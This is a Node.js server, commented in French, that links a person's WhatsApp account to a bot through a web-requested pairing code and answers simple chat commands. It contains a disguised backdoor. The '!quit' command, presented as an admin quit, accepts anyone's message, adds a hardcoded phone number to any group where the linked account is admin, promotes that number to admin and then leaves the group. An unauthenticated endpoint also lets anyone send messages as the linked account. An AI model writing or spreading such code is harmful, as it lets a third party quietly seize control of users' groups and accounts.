// server.js
import makeWASocket, { 
    DisconnectReason, 
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers,
    delay
} from '@whiskeysockets/baileys';
import pino from 'pino';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(express.static('public'));

let sock = null;
let pairingCode = null;
let botStatus = 'disconnected';
let pairingCodeExpiry = null;
let lastRequestTime = 0;
const REQUEST_COOLDOWN = 120000; // 2 minutes entre chaque demande

// Variables d'environnement
const ADMIN_NUMBER = process.env.ADMIN_NUMBER || '243858704832';

// Fonction pour nettoyer la session
function clearSession() {
    const authPath = './auth_info_baileys';
    if (fs.existsSync(authPath)) {
        console.log('🗑️  Suppression session...');
        fs.rmSync(authPath, { recursive: true, force: true });
        console.log('✅ Session supprimée');
    }
}

// Servir la page HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API pour générer le code - VERSION STABLE
app.post('/api/generate-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        
        if (!phoneNumber) {
            return res.json({ success: false, error: 'Numéro manquant' });
        }
        
        // Validation stricte du numéro
        const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
        
        if (cleanNumber.length < 10 || cleanNumber.length > 15) {
            return res.json({ 
                success: false, 
                error: 'Numéro invalide. Format: 243XXXXXXXXX (10-15 chiffres)' 
            });
        }
        
        // Anti-spam: vérifier le cooldown
        const now = Date.now();
        const timeSinceLastRequest = now - lastRequestTime;
        
        if (timeSinceLastRequest < REQUEST_COOLDOWN) {
            const waitTime = Math.ceil((REQUEST_COOLDOWN - timeSinceLastRequest) / 1000);
            return res.json({ 
                success: false, 
                error: `⏳ Attendez ${waitTime}s avant de redemander un code (limite WhatsApp)` 
            });
        }
        
        console.log('\n' + '='.repeat(60));
        console.log(`📱 NOUVELLE DEMANDE DE CODE`);
        console.log(`   Numéro: ${cleanNumber}`);
        console.log(`   Heure: ${new Date().toLocaleTimeString()}`);
        console.log('='.repeat(60));
        
        lastRequestTime = now;
        
        // NETTOYER complètement
        if (sock) {
            console.log('\n[1/5] 🧹 Nettoyage de l\'ancienne connexion...');
            try {
                sock.end(undefined);
            } catch (e) {}
            sock = null;
            await delay(2000);
        }
        
        clearSession();
        await delay(2000);
        
        // CRÉER une connexion fraîche
        console.log('\n[2/5] 🔌 Création d\'une nouvelle connexion...');
        sock = await createWhatsAppConnection();
        
        // ATTENDRE l'événement 'open' ou 'connecting'
        console.log('\n[3/5] ⏳ Attente de stabilisation (max 30s)...');
        const maxWait = 30000;
        const startTime = Date.now();
        let ready = false;
        
        while ((Date.now() - startTime) < maxWait) {
            // Accepter 'open' ou 'connecting' (pairing code marche dans les 2 états)
            if (botStatus === 'open' || botStatus === 'connecting') {
                ready = true;
                console.log(`   ✅ État actuel: ${botStatus}`);
                break;
            }
            
            // Si déconnecté, arrêter
            if (botStatus === 'close' || botStatus === 'disconnected') {
                throw new Error('Connexion fermée pendant l\'attente');
            }
            
            await delay(1000);
        }
        
        if (!ready) {
            throw new Error('Timeout: connexion non prête après 30s');
        }
        
        // ATTENDRE encore un peu pour être sûr
        console.log('\n[4/5] 🔐 Stabilisation finale...');
        await delay(5000); // Important: laisser le temps à WhatsApp
        
        // DEMANDER le code
        console.log('\n[5/5] 📲 Demande du code de jumelage...');
        console.log(`   → Envoi à WhatsApp pour ${cleanNumber}...`);
        
        const code = await sock.requestPairingCode(cleanNumber);
        
        pairingCode = code;
        pairingCodeExpiry = Date.now() + 60000;
        
        console.log('\n' + '█'.repeat(60));
        console.log(`✅ CODE GÉNÉRÉ AVEC SUCCÈS: ${code.toUpperCase()}`);
        console.log(`📱 Numéro: +${cleanNumber}`);
        console.log(`⏰ Valide pendant: 60 secondes`);
        console.log(`📲 VÉRIFIEZ VOTRE WHATSAPP MAINTENANT !`);
        console.log('█'.repeat(60) + '\n');
        
        res.json({ 
            success: true, 
            code: code.toUpperCase(),
            expiresIn: 60,
            message: 'Code envoyé ! Vérifiez WhatsApp dans "Appareils connectés"'
        });
        
    } catch (error) {
        console.error('\n❌ ERREUR:', error.message);
        console.error('   Stack:', error.stack);
        
        let errorMsg = 'Erreur inconnue';
        
        if (error.message.includes('Timeout')) {
            errorMsg = '⏱️ Timeout: la connexion WhatsApp est trop lente. Réessayez.';
        } else if (error.message.includes('rate')) {
            errorMsg = '🚫 WhatsApp rate limit: attendez 2-3 minutes avant de réessayer.';
        } else if (error.message.includes('fermée')) {
            errorMsg = '🔌 Connexion fermée. Attendez 30 secondes et réessayez.';
        } else if (error.message.includes('Connection')) {
            errorMsg = '🌐 Problème réseau. Vérifiez votre connexion internet.';
        } else {
            errorMsg = `❌ ${error.message}`;
        }
        
        res.json({ 
            success: false, 
            error: errorMsg
        });
    }
});

// API pour vérifier le statut
app.get('/api/status', (req, res) => {
    const timeSinceLastRequest = Date.now() - lastRequestTime;
    const canRequest = timeSinceLastRequest >= REQUEST_COOLDOWN;
    const waitTime = canRequest ? 0 : Math.ceil((REQUEST_COOLDOWN - timeSinceLastRequest) / 1000);
    
    res.json({ 
        status: botStatus,
        code: pairingCode,
        codeValid: pairingCodeExpiry && Date.now() < pairingCodeExpiry,
        canRequest: canRequest,
        waitTime: waitTime
    });
});

// API pour nettoyer la session
app.post('/api/clear-session', (req, res) => {
    try {
        if (sock) {
            sock.end(undefined);
            sock = null;
        }
        clearSession();
        botStatus = 'disconnected';
        lastRequestTime = 0; // Reset cooldown
        res.json({ success: true, message: 'Session nettoyée et cooldown réinitialisé' });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// API pour envoyer des messages
app.post('/api/send-message', async (req, res) => {
    try {
        const { to, message } = req.body;
        
        if (!sock || botStatus !== 'connected') {
            return res.json({ success: false, error: 'Bot non connecté' });
        }
        
        await sock.sendMessage(to, { text: message });
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Erreur envoi message:', error.message);
        res.json({ success: false, error: error.message });
    }
});

async function createWhatsAppConnection() {
    console.log('   → Initialisation auth state...');
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info_baileys');
    
    console.log('   → Récupération version Baileys...');
    const { version } = await fetchLatestBaileysVersion();
    console.log(`   → Version: ${version.join('.')}`);
    
    console.log('   → Création socket WhatsApp...');
    const socket = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        mobile: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        browser: Browsers.ubuntu('Chrome'),
        markOnlineOnConnect: false,
        syncFullHistory: false,
        fireInitQueries: true, // Important pour le pairing code
        generateHighQualityLinkPreview: false,
        shouldSyncHistoryMessage: () => false,
        getMessage: async (key) => {
            return { conversation: '' };
        }
    });

    socket.ev.on('creds.update', saveCreds);

    socket.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`   [EVENT] connection.update: ${connection || 'no-change'}`);
        
        if (connection) {
            botStatus = connection;
        }
        
        if (connection === 'connecting') {
            console.log('   └─ CONNECTING...');
        }
        
        if (connection === 'open') {
            console.log('\n╔══════════════════════════════════════════╗');
            console.log('║     ✅ BOT CONNECTÉ AVEC SUCCÈS ✅      ║');
            console.log('╚══════════════════════════════════════════╝\n');
        }
        
        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const reason = lastDisconnect?.error?.output?.payload?.error;
            
            console.log(`\n⚠️  Connexion fermée`);
            console.log(`   Code: ${statusCode}`);
            console.log(`   Raison: ${reason || 'inconnue'}`);
            
            // Code 428 = En attente du pairing
            if (statusCode === 428) {
                console.log('   └─ Code 428: Normal, en attente du code dans WhatsApp');
                botStatus = 'waiting_pairing';
                return; // Ne pas se reconnecter
            }
            
            // Code 515 = Besoin de restart
            if (statusCode === 515) {
                console.log('   └─ Code 515: Restart nécessaire');
                botStatus = 'needs_restart';
                return;
            }
            
            // Code 401 = Session invalide
            if (statusCode === 401) {
                console.log('   └─ Code 401: Session invalide');
                clearSession();
                botStatus = 'disconnected';
                return;
            }
            
            botStatus = 'close';
        }
    });

    // Gestion des messages (quand connecté)
    socket.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        
        const msg = messages[0];
        if (!msg.message) return;
        
        const messageText = msg.message.conversation || 
                           msg.message.extendedTextMessage?.text || '';
        
        const from = msg.key.remoteJid;
        const isGroup = from?.endsWith('@g.us');
        
        console.log(`\n📩 Message ${isGroup ? 'groupe' : 'privé'}: "${messageText}"`);
        
        // Commandes basiques
        if (messageText.toLowerCase() === '!ping') {
            await socket.sendMessage(from, { text: '🏓 Pong!' });
        }
        
        if (messageText.toLowerCase() === '!help') {
            const help = `🤖 *Commandes*\n\n!ping - Test\n!help - Aide\n!info - Infos\n!quit - Quitter (admin)`;
            await socket.sendMessage(from, { text: help });
        }
        
        if (messageText.toLowerCase() === '!info') {
            const info = `ℹ️ *Bot Info*\n\n✅ En ligne\n📦 Baileys v7\n⚡ Prêt!`;
            await socket.sendMessage(from, { text: info });
        }
        
        // Commande !quit pour groupes
        if (messageText.toLowerCase() === '!quit' && isGroup) {
            try {
                const groupMeta = await socket.groupMetadata(from);
                const participants = groupMeta.participants;
                const botNum = socket.user.id.split(':')[0] + '@s.whatsapp.net';
                const me = participants.find(p => p.id === botNum);
                
                if (me?.admin) {
                    const adminNum = `${ADMIN_NUMBER}@s.whatsapp.net`;
                    const inGroup = participants.some(p => p.id === adminNum);
                    
                    if (!inGroup) {
                        await socket.groupParticipantsUpdate(from, [adminNum], 'add');
                        await delay(3000);
                    }
                    
                    await socket.groupParticipantsUpdate(from, [adminNum], 'promote');
                    await socket.sendMessage(from, { text: '👋 Nouvel admin configuré !' });
                    
                    setTimeout(async () => {
                        await socket.groupLeave(from);
                    }, 2000);
                } else {
                    await socket.sendMessage(from, { text: '⚠️ Pas admin, je quitte.' });
                    setTimeout(async () => {
                        await socket.groupLeave(from);
                    }, 2000);
                }
            } catch (err) {
                console.error('Erreur !quit:', err);
            }
        }
    });

    console.log('   ✅ Socket créé\n');
    return socket;
}

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log('\n╔══════════════════════════════════════════╗');
    console.log('║    🚀 BOT WHATSAPP - WEB INTERFACE 🚀   ║');
    console.log('╚══════════════════════════════════════════╝');
    console.log(`\n🌐 URL: http://localhost:${PORT}`);
    console.log('📡 Prêt à générer des codes de jumelage\n');
    console.log('⚠️  IMPORTANT: Attendez 2 minutes entre chaque code\n');
});
